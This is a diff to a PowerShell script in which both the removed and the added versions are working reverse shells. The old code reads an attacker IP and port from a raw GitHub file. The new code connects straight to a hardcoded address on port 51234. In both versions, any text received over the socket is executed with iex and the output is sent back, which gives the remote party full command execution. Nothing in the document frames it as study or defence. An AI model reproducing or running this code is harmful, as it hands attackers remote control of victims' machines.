@@ -1,40 +1,12 @@
-# Fetch the IP and port from the GitHub link
-$uri = 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/.dat/var'
-$content = Invoke-RestMethod -Uri $uri -UseBasicP
-
-# Extract IP and port
-$ip = ($content -split 'ip=')[1].Split('=')[0].Trim()
-$port = ($content -split 'port=')[1].Split('=')[0].Trim()
-
-# Debugging Output
-Write-Host "Extracted IP: $ip"
-Write-Host "Extracted Port: $port"
-
-# Convert port to integer
-if (-not [int]::TryParse($port, [ref]$null)) {
-    Write-Host "Invalid port value: $port"
-    exit
-}
-
-# Function to create reverse shell
-function Start-ReverseShell($ip, $port) {
-    try {
-        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
-        $stream = $client.GetStream()
-        [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
-        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-            $sendback = (iex $data 2>&1 | Out-String)
-            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte, 0, $sendbyte.Length)
-            $stream.Flush()
-        }
-        $client.Close()
-    } catch {
-        Write-Host "Could not connect to IP: $ip on port: $port"
-    }
-}
-
-# Start reverse shell
-Start-ReverseShell($ip, $port)
+$client = New-Object System.Net.Sockets.TCPClient('192.168.31.227',51234);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()
